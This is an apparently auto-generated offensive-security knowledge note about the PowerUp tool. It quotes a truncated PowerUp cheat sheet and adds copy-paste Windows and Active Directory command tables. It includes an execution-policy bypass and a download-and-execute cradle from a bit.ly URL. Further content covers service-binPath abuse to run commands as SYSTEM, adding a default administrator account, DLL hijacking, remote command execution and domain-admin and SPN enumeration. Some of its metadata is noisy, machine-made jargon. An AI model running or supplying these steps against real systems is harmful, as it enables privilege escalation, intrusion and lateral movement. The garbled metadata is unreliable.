---
title: "Trained Knowledge & Topology: PowerUp"
category: knowledge
domain_hub: "[[knowledge/04_windows_powershell_wmi_cim_and_active_directory]]"
os_platform: windows
primary_tactic: Active_Enum
summary: "Operational architecture, decision workflows & Windows/Linux command reference for PowerUp: PowerShell 2.0-7+ cmdlets, Get-CimInstance/Get-WmiObject/wmic queries, WinRM/PSRemoting (Invoke-Command, Enter-PSSession), Active "
when_to_apply: "Apply when working with PowerUp (windows): Apply when automating Windows enumeration with PowerShell or WMI/CIM (`Get-CimInstance`/`wmic`), executing commands remotely via WinRM/WMI, enumerating Active Directory users/groups/computers/trusts/GPOs (`dsquery`/`nltest`/`net`), or auditing Kerberos tickets (`klist`) and SPNs (`setspn`)."
tags: [credential_access, http, john, mdp, pdf, powershell, privilege_escalation, trained, windows, wmic, get-ciminstance, winrm, invoke-command, dsquery, nltest, kerberos, klist, setspn, active_directory, ldap, powerview, powerup]
source_file: "PowerUp"
updated: 2026-10-30
---

# Trained Knowledge & Architecture: `PowerUp.pdf`

- **Source Path:** `~/Projects/CORA/Training/PowerUp.pdf` (`pdf`)
- **Extracted Technical Entities:** `http, john, powershell`
- **Extracted IPs / Subnets:** `None`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_powerup]] (`13` CEGAR-verified commands | `13` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `13` (full executable list in [[commands/trained_powerup]])
- **Tactic Distribution:** `Privilege_Escalation` (8), `Credential_Access` (5)
- **Top Extracted CLI Tools:** `install-servicebinary` (2), `enable-privilege` (1), `get-` (1), `get-modifiableservice` (1), `get-serviceunquoted` (1), `get-sitelistpassword` (1), `get-webconfig` (1), `import-module` (1), `invoke-` (1), `invoke-privescaudit` (1), `strings` (1), `write-hijackdll` (1)

## Extracted Reference Excerpt
--- [Page 1] ---
Version 1.2. Created by Will Schroeder (@harmj0y) and released under the Creative Commons v3 "Attribution" License. 
            PowerUp Cheat Sheet 
 
Getting Started 
Note: PowerUp’s ‘bleeding edge’ will always in be the 
development branch of PowerSploit. 
Get PowerUp: http://bit.ly/1PdjSHk 
Load from disk: 1) C:\> powershell –exec bypass 2) PS 
C:\> Import-Module PowerUp.ps1 
Load from GitHub: PS C:\> IEX (New-Object 
Net.WebClient).DownloadString("http://bit.ly/1PdjSHk") 
Load in Cobalt Strike’s Beacon: beacon> powershell-
import /local/path/to/PowerUp.ps1 , then beacon> 
powershell Invoke-AllChecks 
Getting help: PS C:\> Get-Help Cmdlet-Name [-detailed] [-
full] 
Most PowerUp functions are implemented in Empire in 
privesc/powerup/* 
Invoke-PrivescAudit (old Invoke-AllChecks) will run all 
current privilege escalation checks detailed in this guide 
and will output the appropriate abuse function syntax for 
anything found. The –HTMLReport flag will write out a 
HTML version of the report to SYSTEM.username.html. 
Enumerating Service Vulnerabilities 
Get-ModifiableService 
Enumerates all services 
where the current user can 
modify the service binPath. 
Get-
ModifiableServiceFile 
Enumerates all services 
where the current user can 
write to the associated 
service binary or its 
arguments. 
Get-ServiceUnquoted 
Enumerates all services w/ 
unquoted binary paths. 
Weaponizing Service Vulnerabilities 
Invoke-ServiceAbuse abuses a vulnerable service’s 
binPath to execute commands as SYSTEM. 
Install-ServiceBinary installs a malicious C# binary for a 
specified service. 
Both cmdlets accept the following parameters (as well as 
accepting a service names/service object from Get-
Service on the pipeline): 
Service name to abuse. 
-Name SERVICE 
The username to add 
(defaults to ‘john’). Domain 
users are not created, only 
added to the LocalGroup. 
-UserName 
‘[DOMAIN\]USER’ 
The password for the added 
user (defaults to 
‘Password123!’). 
-Password 
‘P@55Word’ 
The group to add the user to 
(default: ‘Administrators’). 
-LocalGroup “NAME” 
Custom command to execute. 
-Command “net…” 
Install-ServiceBinary backs up the original service path to 
\orig_path.exe.bak. Restore-ServiceBinary will restore 
this backup binary to its original path. 
Set-ServiceBinPath can set a service’s binPath without 
caling sc.exe. 
DLL Hijacking 
Find-PathDLLHijack checks if the current %PATH% has 
any directories that are writeable by the current user. 
Weaponizable for Windows 7 with Write-HijackDll and 
‘FOLDER\PATH\wlbsctrl.dll’. 
Write-HijackDll writes out a self-deleting .bat file to 
\hijackpath\debug.bat that executes a command, and 
writes out a hijackable DLL that launches the .bat. It 
accepts the same -UserName/-Password/-Command 
arguments as

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `PowerUp`

> **Domain Hub:** [[knowledge/04_windows_powershell_wmi_cim_and_active_directory|Domain Hub 04: Windows PowerShell, WMI/CIM, WinRM Remoting, Active Directory (dsquery), Kerberos & Post-Exploitation]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when automating Windows enumeration with PowerShell or WMI/CIM (`Get-CimInstance`/`wmic`), executing commands remotely via WinRM/WMI, enumerating Active Directory users/groups/computers/trusts/GPOs (`dsquery`/`nltest`/`net`), or auditing Kerberos tickets (`klist`) and SPNs (`setspn`).  
> **15-Engine H-MDP State Transition:** `s_active_services_enumerated` $\xrightarrow{\text{Active_Enum}}$ `s_credentials_or_certs_acquired` | **Bayesian Root-Cause Triggers:** `ad_domain_trust_or_spn_exposure, winrm_or_wmi_lateral_movement_path, kerberos_ticket_or_delegation_weakness, unquoted_service_or_gpo_misconfig` | **Isolation:** `RED, BLUE (Active Directory / WinRM network queries require allowed LAN interface; local CIM/WMI works in WHITE)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem \| Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"` | **PowerShell** | Queries `Win32_ComputerSystem` via modern CIM (WS-Man/DCOM) for host domain membership, logged-on console user, and hardware model. | Apply in PowerShell 4.0+ as the fast, structured replacement for `wmic computersystem` (`[[knowledge/trained_ps_get-cim]]`). | `hostnamectl && lscpu && free -h` |
| `powershell -NoProfile -Command "Get-CimInstance Win32_Service \| Where-Object {$_.State -eq 'Running' -and $_.PathName -notmatch 'C:\\Windows'} \| Select-Object Name,DisplayName,StartName,PathName"` | **PowerShell** | Finds all running third-party/custom Windows services whose binary path is outside `C:\Windows`. | Apply to quickly isolate non-OS services and inspect their execution account (`StartName`) and binary path. | `systemctl list-units --type=service --state=running` |
| `powershell -NoProfile -Command "Get-CimInstance -Namespace root\subscription -ClassName __EventFilter; Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer; Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"` | **PowerShell** | Audits the `root\subscription` WMI repository for permanent WMI Event Filters, Consumers, and Bindings. | Apply to detect fileless WMI persistence (`[[knowledge/trained_us-15-graeber-abusing-windows-management-instrumentation-wmi-to-]]`). | `crontab -l && systemctl list-timers --all` |
| `wmic /node:"<TARGET_IP>" process call create "cmd.exe /c ipconfig /all > C:\Temp\out.txt"` | **Windows CMD** | Executes a command remotely on `<TARGET_IP>` over DCOM/RPC (`TCP 135` + dynamic high ports) using WMI `Win32_Process.Create`. | Apply for agentless remote execution across domain hosts when WinRM (`5985`) is closed but RPC (`135`) is open. | `ssh <USER>@<TARGET_IP> 'ip -4 -br addr'` |
| `winrm enumerate winrm/config/listener && powershell -NoProfile -Command "Test-WSMan -ComputerName <TARGET_IP>"` | **CMD / PS** | Enumerates local WinRM listeners (`5985` HTTP / `5986` HTTPS) and tests WS-Management reachability on `<TARGET_IP>`. | Apply before running `Invoke-Command` or `Enter-PSSession` (`[[commands/trained_powershell-remoting]]`). | `nc -zv <TARGET_IP> 22` |
| `powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { hostname; whoami /all; Get-NetIPConfiguration }"` | **PowerShell** | Executes a PowerShell script block on remote host `<TARGET_IP>` over WinRM (`TCP 5985`/`5986`) and returns serialized objects. | Apply for multi-host administrative command execution and remote triage. | `ssh <USER>@<TARGET_IP> 'hostname; id; ip addr'` |
| `nltest /dclist: && nltest /domain_trusts /all_trusts` | **Windows CMD** | Discovers all Domain Controllers in the current domain and enumerates all forest/external/transitive domain trusts. | Apply first during Active Directory reconnaissance (`[[commands/trained_domain_service_tools]]`). | `dig _ldap._tcp.dc._msdcs.<DOMAIN> SRV` |
| `net user /domain && net group "Domain Admins" /domain && net group "Enterprise Admins" /domain` | **Windows CMD** | Queries the Domain Controller for all domain user accounts and members of high-privilege administrative groups. | Apply on any domain-joined workstation/server to map privileged accounts (`[[commands/trained_net_cmds_1]]`). | `ldapsearch -x -H ldap://<DC_IP> -b 'dc=domain,dc=local'` |
| `dsquery user -limit 0 \| dsget user -samid -sid -upn -pwdneverexpires -disabled && dsquery computer -limit 0` | **Windows CMD (AD)** | Queries Active Directory LDAP for all user accounts (with SAMID, SID, and password expiry flags) and all domain computers (`[[commands/trained_ds_cmds]]`). | Apply when RSAT or DC tools are present to export complete Active Directory object inventories. | `ldapsearch -LLL -H ldap://<DC_IP> '(objectClass=user)' sAMAccountName objectSid` |
| `setspn -Q */* && klist` | **Windows CMD** | Lists all Service Principal Names (`SPNs`) registered in Active Directory (`setspn -Q */*`) and inspects cached Kerberos tickets (`klist`). | Apply to locate SQL/HTTP/Exchange service accounts (`Kerberoasting` audit) and verify active TGT/TGS encryption types (`[[knowledge/trained_kerberos_attacks_cheatsheet]]`). | `klist && kvno <SPN>` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [PowerShell] Queries `Win32_ComputerSystem` via modern CIM (WS-Man/DCOM) for host domain membership, logged-on console user, and hardware model.
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
# [PowerShell] Finds all running third-party/custom Windows services whose binary path is outside `C:\Windows`.
powershell -NoProfile -Command "Get-CimInstance Win32_Service | Where-Object {$_.State -eq 'Running' -and $_.PathName -notmatch 'C:\\Windows'} | Select-Object Name,DisplayName,StartName,PathName"
# [PowerShell] Audits the `root\subscription` WMI repository for permanent WMI Event Filters, Consumers, and Bindings.
powershell -NoProfile -Command "Get-CimInstance -Namespace root\subscription -ClassName __EventFilter; Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer; Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"
# [Windows CMD] Executes a command remotely on `<TARGET_IP>` over DCOM/RPC (`TCP 135` + dynamic high ports) using WMI `Win32_Process.Create`.
wmic /node:"<TARGET_IP>" process call create "cmd.exe /c ipconfig /all > C:\Temp\out.txt"
# [CMD / PS] Enumerates local WinRM listeners (`5985` HTTP / `5986` HTTPS) and tests WS-Management reachability on `<TARGET_IP>`.
winrm enumerate winrm/config/listener && powershell -NoProfile -Command "Test-WSMan -ComputerName <TARGET_IP>"
# [PowerShell] Executes a PowerShell script block on remote host `<TARGET_IP>` over WinRM (`TCP 5985`/`5986`) and returns serialized objects.
powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { hostname; whoami /all; Get-NetIPConfiguration }"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
